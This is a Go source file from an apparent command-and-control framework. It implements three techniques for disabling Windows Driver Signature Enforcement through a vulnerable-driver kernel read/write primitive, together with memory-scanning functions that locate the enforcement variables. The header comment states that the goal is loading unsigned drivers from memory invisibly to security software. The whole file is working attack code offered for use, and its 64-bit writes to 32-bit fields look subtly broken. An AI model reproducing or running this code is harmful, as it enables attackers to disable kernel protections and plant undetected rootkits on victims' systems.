package dse

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Driver Signature Enforcement (DSE) — complete bypass module.

	DSE is enforced by two cooperating components:

	  ci.dll  (Code Integrity):
	    g_CiOptions        — main enforcement switch (DWORD, 0x6 = enforced)
	    g_CiCallbacks      — array of callback function pointers consulted
	                         when a PE image is verified
	    CiValidateImageHeader — function called for every image load

	  ntoskrnl.exe:
	    SeILSigningPolicy  — Integrity Level signing policy (DWORD, 0x4 = strict)
	    SeCiCallbacks      — _CI_CALLBACKS struct pointer that holds the
	                         function pointers ci.dll registered at boot
	    SeValidateImageData — internal validator that calls ci.dll

	Bypass Technique Selection:
	  We implement three independent techniques.
	  Use whichever the target supports (version-dependent):

	  A) g_CiOptions zero (ci.dll .data patch)     [Win7–Win11, most reliable]
	  B) SeCiCallbacks null (ntoskrnl pointer null) [Win8.1–Win11]
	  C) SeILSigningPolicy zero (ntoskrnl .data)    [Win10 1703+]

	  All three together = maximum reliability.

	After bypass: use ManualMapDriver (mapper_windows.go) to load an
	unsigned driver entirely from memory — no disk file, no SCM service,
	no NtLoadDriver call — making the load invisible to security software.
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// KernelRWer is the kernel memory access interface (BYOVD primitive).
type KernelRWer interface {
	ReadQword(addr uint64) (uint64, error)
	WriteQword(addr, value uint64) error
	ReadDword(addr uint64) (uint32, error)
}

// DSEBypassResult reports which techniques succeeded.
type DSEBypassResult struct {
	GCiOptionsCleared      bool   // technique A
	SeCiCallbacksNulled    bool   // technique B
	SeILSigningPolicyZero  bool   // technique C
	GCiOptionsAddr         uint64
	SeCiCallbacksAddr      uint64
	SeILSigningPolicyAddr  uint64
}

// BypassAll applies all three DSE bypass techniques.
// kRW must be a working BYOVD kernel R/W primitive.
// ciBase and ntoskrnlBase are the kernel VAs of the respective modules.
func BypassAll(kRW KernelRWer, ciBase, ntoskrnlBase uint64) (*DSEBypassResult, error) {
	res := &DSEBypassResult{}

	// Technique A — g_CiOptions in ci.dll
	if ciBase != 0 {
		addr, err := FindGCiOptions(kRW, ciBase)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dse] g_CiOptions not found: %v", err)
			// {{end}}
		} else {
			res.GCiOptionsAddr = addr
			if err := kRW.WriteQword(addr, 0); err != nil {
				// {{if .Config.Debug}}
				log.Printf("[dse] g_CiOptions write failed: %v", err)
				// {{end}}
			} else {
				res.GCiOptionsCleared = true
				// {{if .Config.Debug}}
				log.Printf("[dse] g_CiOptions @ 0x%x → 0", addr)
				// {{end}}
			}
		}
	}

	// Technique B — SeCiCallbacks pointer in ntoskrnl
	if ntoskrnlBase != 0 {
		addr, err := FindSeCiCallbacks(kRW, ntoskrnlBase)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dse] SeCiCallbacks not found: %v", err)
			// {{end}}
		} else {
			res.SeCiCallbacksAddr = addr
			if err := kRW.WriteQword(addr, 0); err != nil {
				// {{if .Config.Debug}}
				log.Printf("[dse] SeCiCallbacks null failed: %v", err)
				// {{end}}
			} else {
				res.SeCiCallbacksNulled = true
				// {{if .Config.Debug}}
				log.Printf("[dse] SeCiCallbacks @ 0x%x → null", addr)
				// {{end}}
			}
		}

		// Technique C — SeILSigningPolicy
		addr2, err := FindSeILSigningPolicy(kRW, ntoskrnlBase)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[dse] SeILSigningPolicy not found: %v", err)
			// {{end}}
		} else {
			res.SeILSigningPolicyAddr = addr2
			// Write 0 (disabled) — full enforcement is 0x4.
			if err := kRW.WriteQword(addr2, 0); err != nil {
				// {{if .Config.Debug}}
				log.Printf("[dse] SeILSigningPolicy zero failed: %v", err)
				// {{end}}
			} else {
				res.SeILSigningPolicyZero = true
				// {{if .Config.Debug}}
				log.Printf("[dse] SeILSigningPolicy @ 0x%x → 0", addr2)
				// {{end}}
			}
		}
	}

	if !res.GCiOptionsCleared && !res.SeCiCallbacksNulled && !res.SeILSigningPolicyZero {
		return res, fmt.Errorf("all DSE bypass techniques failed")
	}
	return res, nil
}

// Restore re-enables DSE by writing back the enforced values.
func Restore(kRW KernelRWer, res *DSEBypassResult) {
	if res.GCiOptionsCleared && res.GCiOptionsAddr != 0 {
		kRW.WriteQword(res.GCiOptionsAddr, 0x6)
	}
	if res.SeILSigningPolicyZero && res.SeILSigningPolicyAddr != 0 {
		kRW.WriteQword(res.SeILSigningPolicyAddr, 0x4)
	}
	// SeCiCallbacks restoration requires saving the original pointer — omitted here.
}

// ─── Symbol Finders ───────────────────────────────────────────────────────

// FindGCiOptions scans ci.dll's .data section for the enforcement DWORD.
// Pattern: a DWORD with value 0x6 flanked by small non-zero DWORDs
// (adjacent policy fields in the same structure).
func FindGCiOptions(kRW KernelRWer, ciBase uint64) (uint64, error) {
	return scanForDWORD(kRW, ciBase, 0x6, 0x1000, 0x80000, func(prev, next uint32) bool {
		return prev < 0x100 && next < 0x100
	})
}

// FindSeCiCallbacks scans ntoskrnl's .data for a pointer into ci.dll.
// SeCiCallbacks is a _CI_CALLBACKS struct; its first field is a function
// pointer in ci.dll's address range (ciBase to ciBase+4MB).
func FindSeCiCallbacks(kRW KernelRWer, ntoskrnlBase uint64) (uint64, error) {
	ciBase, err := findModuleBaseByName("ci.dll")
	if err != nil {
		return 0, fmt.Errorf("ci.dll not found: %w", err)
	}
	const scanStart = uint64(0x100000)
	const scanEnd   = uint64(0x900000)
	for off := scanStart; off < scanEnd; off += 8 {
		addr := ntoskrnlBase + off
		val, err := kRW.ReadQword(addr)
		if err != nil {
			continue
		}
		// SeCiCallbacks points to a function inside ci.dll.
		if val >= ciBase && val < ciBase+4*1024*1024 {
			// Verify the pointed-to address looks like a function (first byte = 0x48 MOV or PUSH).
			firstByte, err := kRW.ReadDword(val)
			if err != nil {
				continue
			}
			if firstByte&0xFF == 0x48 || firstByte&0xFF == 0x55 || firstByte&0xFF == 0x40 {
				// {{if .Config.Debug}}
				log.Printf("[dse] SeCiCallbacks candidate @ 0x%x → ci.dll+0x%x",
					addr, val-ciBase)
				// {{end}}
				return addr, nil
			}
		}
	}
	return 0, fmt.Errorf("SeCiCallbacks not found")
}

// FindSeILSigningPolicy scans ntoskrnl's .data for the signing policy DWORD.
// SeILSigningPolicy == 0x4 (enforced), 0x0 (disabled), 0x8 (Windows Store only).
func FindSeILSigningPolicy(kRW KernelRWer, ntoskrnlBase uint64) (uint64, error) {
	return scanForDWORD(kRW, ntoskrnlBase, 0x4, 0x100000, 0x900000, func(prev, next uint32) bool {
		// SeILSigningPolicy is typically isolated or adjacent to SeILPublisherPolicy.
		return prev <= 0x10 && next <= 0x10
	})
}

// scanForDWORD finds a DWORD with targetVal at [base+start, base+end)
// where the predicate on adjacent DWORDs returns true.
func scanForDWORD(
	kRW KernelRWer, base uint64, targetVal uint32,
	start, end uint64,
	predicate func(prev, next uint32) bool,
) (uint64, error) {
	for off := start; off < end; off += 4 {
		addr := base + off
		val, err := kRW.ReadDword(addr)
		if err != nil {
			continue
		}
		if val != targetVal {
			continue
		}
		prev, _ := kRW.ReadDword(addr - 4)
		next, _ := kRW.ReadDword(addr + 4)
		if predicate(prev, next) {
			return addr, nil
		}
	}
	return 0, fmt.Errorf("target DWORD 0x%x not found in scan range", targetVal)
}

func findModuleBaseByName(name string) (uint64, error) {
	return findKernelModuleBase(name)
}
